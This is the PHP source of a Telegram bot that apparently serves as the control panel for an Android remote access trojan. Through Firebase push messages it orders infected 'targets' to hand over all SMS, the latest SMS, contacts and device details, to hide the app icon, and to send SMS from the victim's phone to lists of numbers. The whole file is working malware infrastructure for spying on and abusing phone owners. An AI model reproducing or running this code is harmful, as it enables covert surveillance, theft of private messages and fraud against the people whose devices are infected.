<?php 
error_reporting(0);

include("info.php");

define( 'TOKEN', $token );
define( 'API_ACCESS_KEY', $apikey );
if(!file_exists("userlist")){
mkdir("userlist");

}if(!file_exists("admins")){
file_put_contents("admins","");

}
if(!file_exists("user.txt")){
file_put_contents("user.txt","");

}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot".TOKEN."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}


function pingbot(){
    
    $ch = curl_init("127.0.0.1"); 
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
  if(curl_exec($ch))
  {
  $info = curl_getinfo($ch);
 return $info['total_time'] ;
  }

  curl_close($ch);

}

function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
function ping($action){
$port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
   
}
function sm1($chatid,$text,$reply){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_to_message_id'=>$reply
	]);
}
function em($chatid,$message_id,$text,$keyboard){
bot('editmessagetext',[ 
    'chat_id'=>$chatid, 
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard
	]);
	}
	
	
	
	
	
	
	
	$dir = "userlist";
$folders = array('..', '.', 'folder');
$files = array_diff(scandir($dir), $folders);
	
 
   
  foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);
$pmodel=json_decode(file_get_contents("userlist/$tr"))->name;

$key[]= [['text'=>$name, 'callback_data'=>"androidid $pmodel $and"]];

}
$key[]= [['text'=> "بازگشت", 'callback_data'=> "back1"]];
$keyboard1= json_encode(['inline_keyboard'=> $key]);

 foreach($files as $tr){
$and=json_decode(file_get_contents("userlist/$tr"))->androidid;
$name = str_replace(".json","",$tr);


$key1[]= [['text'=>$name, 'callback_data'=>"deletes $name $and"]];

}


$key1[]= [['text'=> "بازگشت", 'callback_data'=> "back1"]];


   
 $keyboard2= json_encode(['inline_keyboard'=> $key1]);
  

   
function sm($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
    $pingbot=pingbot();
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id)?$update->callback_query->message->from->id:$update->message->from->id;
$text=$update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
$adminact= file_get_contents("admins");
$count=count(scandir("userlist"))-2;
$step = file_get_contents("link.txt");
//==================================================,'callback_data' => 'PhoneList'
$starta = json_encode(array('inline_keyboard'=>[[['text'=>"♻️PING(ALL)♻️",'callback_data' => 'pingall'],['text'=>"",'callback_data' => 'PhoneList']],
[['text'=>"❌DELL TARGET❌",'callback_data' => 'delete'],['text'=>"✳️BOT PING✳️",'callback_data' => 'botping']],
[['text'=>"Set Target ⚡️",'callback_data' => 'settaget'],['text'=>"Set Url 🌐",'callback_data' => 'setlink']],
]));
$admins = json_encode(array('inline_keyboard'=>[[['text'=>"♻️PING♻️",'callback_data' => 'pingone'],['text'=>"ℹ️GeT INFOℹ️",'callback_data' => 'deviceinfo']],
[['text'=>"📥GeT All SmS📤",'callback_data' => 'smsget']],[['text'=>"📨SEND SMS📨",'callback_data' => 'sendmessage'],['text'=>"🔅HiDe ICON🔅️",'callback_data' => 'hideicon']],[['text'=>"♻️GeT ConTaCt♻️️",'callback_data' => 'getcontact']],
[['text'=>"💌GeT LasT SmS💌",'callback_data' => 'getlastsms']],
[['text'=>"Back",'callback_data' => 'back1']],
]));
$back4=json_encode(array('inline_keyboard'=>[[['text'=>"Back",'callback_data' => 'back4']]]));
$back1=json_encode(array('inline_keyboard'=>[[['text'=>"Back",'callback_data' => 'back1']]]));
$back5=json_encode(array('inline_keyboard'=>[[['text'=>"🟢YES🟢",'callback_data' => 'yess'],['text'=>"🔴NO🔴",'callback_data' => 'noo']]]));

if(in_array($chat_id,$admin_list)){
	if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
	                                file_put_contents("link.txt","none");
	    sm($chat_id,"🧸Hello BaBe:)

📲Targets : $count

✏️CR : @ALFLAATON",$starta);

	}

        if($data == "settaget"){
      
      em($chat_id,$mi,"Send My Android Id 🔧",$back1);
   file_put_contents("link.txt","id2");

  }
elseif($step  == "id2" && isset($text)){
        file_put_contents('p',$text);
        $devicetoken=file_get_contents("p");  
              sm($chat_id,"RemoTe ControL PaneL For ( $devicetoken ) OPenD!

🎃For Control This Target Use Button 👇🏽",$admins);
                            file_put_contents("link.txt","none");
    }
elseif($data == "PhoneList"){
	    
	    em($chat_id,$mi,"📜This IS TarGet LIST:",$keyboard1);
	    
	    
	}
	
	    }
if(strpos($text, "/a ") !== false){
    $code = str_replace("/a ", null, $text);
file_put_contents("p",$code);
$devicetoken=file_get_contents("p");
              sm($chat_id,'Sted 🎃',$admins);
}
if(strpos($text, "/logintouser") !== false){
    $code = str_replace("/logintouser", null, $text);
file_put_contents("p",$code);
$devicetoken=file_get_contents("p");
              sm($chat_id,"$devicetoken",$adm32432234ins);
              sm($chat_id,'Sted 🎃',$admins);
}
elseif($data == "pingall"){
	    ping('ping');        
	    em($chat_id,$mi,"✳️RequesT SenDed For $count Target!

More InFo in NexT Message♻️",$back1);
	   
	    
	}elseif($data=="botping"){
	    
	    
	    
	     em($chat_id,$mi,"♻️BoT PING Geted

StaTuS : ON 🔥

TarGetS: $count ♨️

⚡️PiNG BOT : $pingbot",$back1);
	    
	    
	    
	    
	}elseif(strpos($data,'androidid') !==false){
	   $datass=explode(" ",$data);
	 file_put_contents('p',$datass[2]);   
	 file_put_contents('name',$datass[1]);      
	    	            
	    em($chat_id,$mi,"🎖RemoTe ControL PaneL For ( $datass[1] ) OPenD!

🎃For Control This Target Use Button 👇🏽",$admins);
	    
	}elseif($data == "pingone"){
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     action('pingone',$androidid);
	     
	    em($chat_id,$mi,"✳️GeT PING For ( $androidid ) TargeT!


🎃More INFO In NeXt Messages:)️",$back4);
	   
	    
	}elseif($data == "deviceinfo"){
	     $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	     
	     action('getdevicefullinfo',$androidid);
	     
	    em($chat_id,$mi,"⚜️GET INFO FoR ( $androidid ) Target

🎃More INFO In NeXt Messages:)️️",$back4);
	   
	    
	}elseif($data == "getcontact"){
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getcontact',$androidid);
	     
	    em($chat_id,$mi,"⚜️GET ConTaCT ReQuEsT FoR ( $androidid ) Target

🎃More INFO In NeXt Messages:)️️",$back4);
	    
	    
	    
	}elseif($data == "smsget"){
	    $androidid=file_get_contents('p');  
	     $name = file_get_contents('name');  
	    
	     action('getsms',$androidid);
	     
	    em($chat_id,$mi,"⚜️GET SmS ReQuEsT FoR ( $androidid ) Target

🎃More INFO In NeXt Messages:)️️",$back4);
	    
	    
	    
	}
	
	
	
	elseif($data == "sendmessage"){
	    

	    em($chat_id,$mi,"🍄SenD Me Phone Number 🍄
🔆U can send 20 Phone Number in one message 🔆
Example : 
09912345678
09142315674
09013456789
.....️",$back4);
   
   file_put_contents("admins","message");
   
   
	

    }
    
	elseif($data == "hideicon"){
	  $androidid=file_get_contents('p');  
action('hideicon',$androidid);
   $name=file_get_contents('name');  
     $texts="✳️Hide ICoN ReQueSt For ( $androidid ) TarGeT!

♿️More INFo IN NeXT MesSage";
  

  
	    em($chat_id,$mi,$texts,$back4);
	       
  
 
    
	    
	  
	    
	    
	}elseif($data == "getlastsms"){
	  $androidid=file_get_contents('p');  
action('lastsms',$androidid);
   $name=file_get_contents('name');  
     $texts="✳️RequeST Sended For ( $androidid ) TarGeT!

♿️More INFo IN NeXT MesSage";
  

  
	    em($chat_id,$mi,$texts,$back4);
	       
	}elseif($data == "delete"){
	    
	     em($chat_id,$mi,"❌SeLecT The TarGet YoU WanT DeleTe:👇🏽",$keyboard2);
	    
	    
	}elseif(strpos($data,'deletes') !==false){
	   $delete=explode(" ",$data);
	   
	   $tkh = json_decode(file_get_contents("userlist/$delete[1].json"))->androidid;	  
	   $handler2 = file_get_contents('user.txt');
			$rete = $tkh.'/';
			$han = str_replace($rete,'',$handler2);
			file_put_contents('user.txt',$han);
	    em($chat_id,$mi,"🎖♻️❌TarGet DeLeTeD!❌♻️",$back1);
	    unlink("userlist/$delete[1].json");
	}
	
	elseif($data == "back1"){
	     file_put_contents("admins","");
	   	    file_put_contents("nump","");
	   	    	    file_put_contents("p","");
	   	    	    	    file_put_contents("mess","");
	   	    	    	                                file_put_contents("link.txt","none");
file_put_contents("admins","");
 em($chat_id,$mi,"🧸Hello BaBe:)

📲Targets : $count

✏️CR : @ALFLAATON",$starta);

	}
	
    	        if($data == "setlink"){
      em($chat_id,$mi,"Send Me Link 🧸",$back1);
   file_put_contents("link.txt","url1");
  

    }
elseif($step  == "url1" && isset($text)){
    file_put_contents('url.txt',$text);
              sm($chat_id,"Done ✨",$back1);
                    file_put_contents("link.txt","none");
        }
        elseif($data == "Back3"){
	   file_put_contents("admins","");
	   	    file_put_contents("nump","");
	   	    	    file_put_contents("p","");
	   	    	    	    file_put_contents("mess","");
 em($chat_id,$mi,"📜This IS TarGet LIST:",$keyboard1);

	}elseif($data == "back4"){
	      
 $name = file_get_contents('name');  
	    file_put_contents("admins","");
	    	    $androidid=file_get_contents('p');  

 em($chat_id,$mi,"🎖RemoTe ControL PaneL For ( $androidid ) OPenD!

🎃For Control This Target Use Button 👇🏽",$admins);

	}elseif($adminact == "message" ){
        file_put_contents('nump',$text);
        
        $nump=file_get_contents("nump");
        
        	    sm($chat_id,"♻️So U r PhoneNum Seted!

$nump


🎯Now Send U r Message️",$back4);
        
         file_put_contents("admins","message1");
    }elseif($adminact == "message1" ){
        file_put_contents('mess',$text);
        $nump=file_get_contents("nump");
        $messs=file_get_contents("mess");
        
        	    sm($chat_id,"🔅U R MesSage Seted!

$messs 

✳️U R NumBerS : 


$nump


⚠️R U SuRE WanT SenD?️",$back5);
        
         file_put_contents("admins","");
    }elseif($data == "noo"){
file_put_contents("admins","");
  	    	    $androidid=file_get_contents('p');  

 $name = file_get_contents('name');  
 em($chat_id,$mi,"🎖RemoTe ControL PaneL For ( $androidid ) OPenD!

🎃For Control This Target Use Button 👇🏽",$admins);

	}elseif($data == "yess"){
	    $androidid=file_get_contents('p');  
	  $messs=  file_get_contents("mess");
 $data = file_get_contents('nump');
    $str = explode("\n", $data); 
        $time = count($str) * 1;
    foreach ($str as $str1) {
        
  sendmess("SendSingleMessage",$androidid,$str1,$messs);
       sleep(0.2);
    
    }
	
	    
	    
	    file_put_contents("mess","");
	    file_put_contents("nump","");
	     em($chat_id,$mi,"✅U R reQueST WaS SenDeD!
$time
⚜️MoRe INFo IN NeXt Message:)",$admins);
	    
	    
	    
	    
	}
	




  ?>
